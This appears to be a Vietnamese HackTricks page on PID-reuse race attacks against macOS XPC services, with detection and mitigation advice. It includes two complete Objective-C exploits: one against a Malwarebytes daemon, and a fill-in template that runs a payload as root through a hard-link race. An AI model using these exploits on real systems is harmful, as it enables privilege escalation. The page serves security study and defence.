# Tái sử dụng PID trên macOS

{{#include ../../../../../../banners/hacktricks-training.md}}

## Tái sử dụng PID

Khi một **XPC service** trên macOS xác thực bên gọi bằng cách tra cứu **PID** thay vì dùng thông tin xác thực gắn với thông điệp nhận được, service đó có thể dễ bị tấn công tái sử dụng PID. Primitive thực tế không phải là chờ namespace PID quay vòng: attacker gửi một yêu cầu XPC rồi lập tức gọi **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** với `POSIX_SPAWN_SETEXEC`, thay thế process image của attacker bằng một **binary được cho phép trong khi vẫn giữ nguyên PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Nếu server lấy yêu cầu khỏi hàng đợi rồi mới phân giải PID dạng số đó thành một process đang hoạt động để kiểm tra code signing, entitlement, đường dẫn hoặc process cha, nó sẽ thấy binary thay thế thay vì process đã gửi thông điệp. `POSIX_SPAWN_START_SUSPENDED` giữ binary thay thế đáng tin cậy ở trạng thái ổn định trong khi server thực hiện kiểm tra.<sup>[[1]](#references)[[2]](#references)</sup>

### Thực chất là gì đang bị race

Chuỗi dễ bị tấn công là một **TOCTOU về danh tính thông điệp**, chứ không đơn giản chỉ là “PID có thể lặp lại”:<sup>[[1]](#references)[[2]](#references)</sup>

1. Một process attacker thiết lập hoặc tiếp tục một kết nối XPC rồi xếp yêu cầu đặc quyền vào hàng đợi.
2. Trước khi service chuyển PID của kết nối thành `SecCodeRef` hoặc một đối tượng process khác, attacker thay thế process đó bằng một executable đã được phê duyệt bằng `POSIX_SPAWN_SETEXEC`.
3. Service xác thực image đã được phê duyệt hiện gắn với PID đó, rồi dispatch yêu cầu do attacker kiểm soát đã nằm sẵn trong hàng đợi.

Bất kỳ cầu nối PID nào trong luồng dữ liệu phân quyền đều đáng ngờ: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` hoặc `audit_token_to_pid`, rồi đến `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` hoặc một trình xác minh chữ ký tùy chỉnh. PID chỉ được dùng để ghi log thì chưa đủ; hãy xác nhận rằng nó ảnh hưởng đến quyết định cho phép/từ chối. Đồng thời kiểm tra các nhánh xử lý lỗi: thử tra cứu audit token trước nhưng **chuyển sang PID dự phòng nếu thất bại** sẽ tạo lại chính race này. Mẫu dự phòng này xuất hiện trong một phân tích năm 2026 về các XPC service có đặc quyền của Intego.<sup>[[3]](#references)</sup>

### Phân tích nhanh bằng static và dynamic

Bắt đầu từ trình xử lý kết nối rồi lần theo từng hàm tạo PID đến các bước kiểm tra code signing, entitlement, đường dẫn executable hoặc phiên bản. Các lệnh này giúp kiểm tra nhanh một helper đang được xem xét; ngay cả khi binary đã bị strip, các symbol được import, selector Objective-C hoặc chuỗi chẩn đoán thường vẫn còn:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```

Trong một bài kiểm thử có kiểm soát, hãy làm hỏng hoặc hook cả nguồn PID lẫn bộ xác minh của nó. Việc bắt gặp `xpc_connection_get_pid` hoặc `-processIdentifier` chỉ là manh mối; bằng chứng hữu ích là lần tra cứu sau đó của **cùng một số nguyên** sau khi yêu cầu đã được nhận. Frida cũng có thể hook bộ xác minh dành riêng cho ứng dụng và privileged selector để đo xem selector có được thực thi khi PID race thắng hay không.<sup>[[3]](#references)</sup>

### Ví dụ khai thác

Nếu bạn thấy hàm **`shouldAcceptNewConnection`** hoặc một hàm được nó gọi đang gọi **`processIdentifier`** mà không gọi **`auditToken`**, thì rất có thể hàm đó đang **xác minh PID của tiến trình** chứ không phải audit token.\
Ví dụ như trong hình này (lấy từ tài liệu tham khảo):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Xem exploit mẫu này (cũng lấy từ tài liệu tham khảo) để thấy 2 phần của exploit:<sup>[[1]](#references)</sup>

- Một phần **tạo nhiều fork**
- **Mỗi fork** sẽ **gửi** **payload** đến XPC service trong khi thực thi **`posix_spawn`** ngay sau khi gửi message.

> [!CAUTION]
> Khi chạy đua với `fork()` từ một tiến trình Objective-C, hãy chạy exploit với `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` được export hoặc nhúng marker `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Tùy chọn đầu tiên sử dụng **`NSTasks`** và đối số để khởi chạy các tiến trình con nhằm khai thác RC

```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

    // send the XPC messages
    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
    xpcConnection.remoteObjectInterface = remoteInterface;

    [xpcConnection resume];
    [xpcConnection.remoteObjectProxy restartOS];

    char target_binary[] = BINARY;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSTask *processes[RACE_COUNT];

    for (int i = 0; i < RACE_COUNT; i++) {
        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
    }

    int i = 0;
    struct timespec ts = {
        .tv_sec = 0,
        .tv_nsec = 500 * 1000000,
    };

    nanosleep(&ts, NULL);
    if (++i > 4) {
        for (int i = 0; i < RACE_COUNT; i++) {
            [processes[i] terminate];
        }
        return false;
    }

    return true;
}

int main(int argc, const char * argv[]) {

    if(argc > 1) {
        // called from the NSTasks
        child();

    } else {
        NSLog(@"Starting the race");
        create_nstasks();
    }

    return 0;
}
```

{{#endtab}}

{{#tab name="fork"}}
Ví dụ này dùng **`fork`** thô để khởi chạy **các tiến trình con khai thác điều kiện race PID**, sau đó khai thác **một điều kiện race khác thông qua Hard link:**

```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
 * Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
 * XPC service verify the legit binary and then execute as root out payload.
 */
void *check_race(void *arg) {
    while(!pwned) {
        // Overwrite with contents of the legit binary
        system("cat ./legit_bin > hard_link");
        usleep(50000);

        // Overwrite with contents of the payload to execute
        // TODO: COMPILE YOUR OWN PAYLOAD BIN
        system("cat ./payload > hard_link");
        usleep(50000);
    }
    return NULL;
}

void child_xpc_pid_rc_abuse(){
    // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
    #define kValid "./Legit Updater.app/Contents/MacOS/Legit"
    extern char **environ;

    // Connect with XPC service
    // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
    NSString*  service_name = @"com.example.Helper";
    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
    // TODO: CNAGE THE PROTOCOL NAME
    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
    [connection setRemoteObjectInterface:interface];
    [connection resume];

    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
        NSLog(@"[-] Something went wrong");
        NSLog(@"[-] Error: %@", error);
    }];

    NSLog(@"obj: %@", obj);
    NSLog(@"conn: %@", connection);

    // Call vulenrable XPC function
    // TODO: CHANGE NAME OF FUNCTION TO CALL
    [obj DoSomething:^(_Bool b){
        NSLog(@"Response, %hdd", b);
    }];

    // Change current process to the legit binary suspended
    char target_binary[] = kValid;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
 * Function to perform the PID race condition using children calling the XPC exploit.
 */
void xpc_pid_rc_abuse() {
    #define RACE_COUNT 1
    extern char **environ;
    int pids[RACE_COUNT];

    // Fork child processes to exploit
    for (int i = 0; i < RACE_COUNT; i++) {
        int pid = fork();
        if (pid == 0) {  // If a child process
            child_xpc_pid_rc_abuse();
        }
        printf("forked %d\n", pid);
        pids[i] = pid;
    }

    // Wait for children to finish their tasks
    sleep(3);

    // Terminate child processes
    for (int i = 0; i < RACE_COUNT; i++) {
        if (pids[i]) {
            kill(pids[i], 9);
        }
    }
}

int main(int argc, const char * argv[]) {
    // Create and set execution rights to 'hard_link' file
    system("touch hard_link");
    system("chmod +x hard_link");

    // Create thread to exploit sign verification RC
    pthread_t thread;
    pthread_create(&thread, NULL, check_race, NULL);

    while(!pwned) {
        // Try creating 'download' directory, ignore errors
        system("mkdir download 2>/dev/null");

        // Create a hardlink
        // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
        system("ln hard_link download/legit_bin");

        xpc_pid_rc_abuse();
        usleep(10000);

        // The payload will generate this file if exploitation is successful
        if (access("/tmp/pwned", F_OK ) == 0) {
            pwned = true;
        }
    }

    return 0;
}
```

{{#endtab}}
{{#endtabs}}

## Làm cho cuộc đua có thể tái hiện

Các điểm tinh chỉnh sau thường xuất hiện trong những exploit tái sử dụng PID hoạt động hiệu quả và các thử nghiệm gần đây với helper có đặc quyền:<sup>[[1]](#references)[[3]](#references)</sup>

- Gửi request rồi gọi `posix_spawn` ngay lập tức; **không** chờ phản hồi. Request phải được đưa vào hàng đợi trước khi máy chủ tra cứu PID sau khi thay thế image.
- Dùng đồng thời `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`. Cờ đầu tiên giữ nguyên PID của tiến trình đang cạnh tranh; cờ thứ hai ngăn target hợp lệ thoát hoặc thay đổi trạng thái trước khi xác thực.
- Dùng nhiều tiến trình cạnh tranh có thời gian sống ngắn và thử lại toàn bộ chuỗi kết nối/request/exec. Số lượng tối ưu tùy thuộc vào target; quá nhiều tiến trình con có thể làm chậm dịch vụ và khiến cửa sổ hẹp hơn.
- Tiến trình thay thế phải đáp ứng **toàn bộ** yêu cầu của máy chủ. Khi có thể, hãy dùng lại binary client hợp lệ và trước tiên kiểm tra designated requirement của nó bằng `codesign -d -r- "/path/to/client.app"`.
- Trước tiên, gọi một selector được export nhưng vô hại hoặc một phương thức chỉ đọc. Việc này giúp phân biệt giữa giành được quyền xác thực và khai thác thành công một primitive có đặc quyền ở bước sau.

## Tránh cầu nối PID

Trên macOS 13+, Foundation cung cấp `-[NSXPCConnection setCodeSigningRequirement:]`. Thiết lập yêu cầu đối với peer chính xác một lần và **trước** khi gọi `resume`; chuỗi yêu cầu không hợp lệ sẽ gây exception (hoặc lỗi fatal trong Swift), còn message từ peer không đáp ứng yêu cầu sẽ làm connection mất hiệu lực. Nhờ đó, XPC có thể thực thi việc kiểm tra danh tính code của peer mà không cần application code tra cứu PID.<sup>[[6]](#references)</sup>

```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
    @try {
        NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
                         @"and certificate leaf[subject.OU] = \"TEAMID\"";
        [c setCodeSigningRequirement:req];
    } @catch (NSException *e) {
        return NO;
    }
    c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
    c.exportedObject = self;
    [c resume];
    return YES;
}
```

Với API listener cấp thấp hiện đại trên macOS 26+, `xpc_listener_set_peer_requirement` áp dụng một `xpc_peer_requirement_t` đã được xác thực khi listener không hoạt động. XPC loại bỏ các request không đáp ứng yêu cầu này; các peer session được tạo từ listener **không** kế thừa yêu cầu đó, vì vậy hãy áp dụng thêm một session requirement phù hợp khi các session này cấp quyền cho những thao tác đặc quyền.<sup>[[7]](#references)</sup>

> [!WARNING]
> Đừng “khắc phục” vấn đề này bằng cách sao chép audit token rồi chuyển ngược thành PID để thực hiện `SecCode` lookup. Hãy giữ nguyên danh tính được suy ra từ audit token trong suốt quá trình ra quyết định cấp quyền, hoặc sử dụng API XPC peer-requirement từ đầu đến cuối.<sup>[[2]](#references)[[6]](#references)</sup> Các API audit-token trên toàn connection cũng có một dạng race riêng, được đề cập trong [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Các ví dụ khác

- [**Intego X9: Vì sao phần mềm diệt virus macOS của bạn không nên tin tưởng PID**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE nhắm vào privileged helper của một AV, vốn xác thực client bằng PID.<sup>[[3]](#references)</sup>
- [**Khai thác dịch vụ XPC GOG Galaxy để leo thang đặc quyền trên macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Phần II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Tìm hiểu khai thác XPC - Phần 2: Đừng tin PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Đừng tin PID! Những câu chuyện về một lỗi logic đơn giản và cách tìm ra nó - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Vì sao phần mềm diệt virus macOS của bạn không nên tin tưởng PID](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Khai thác dịch vụ XPC GOG Galaxy để leo thang đặc quyền trên macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Phần II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
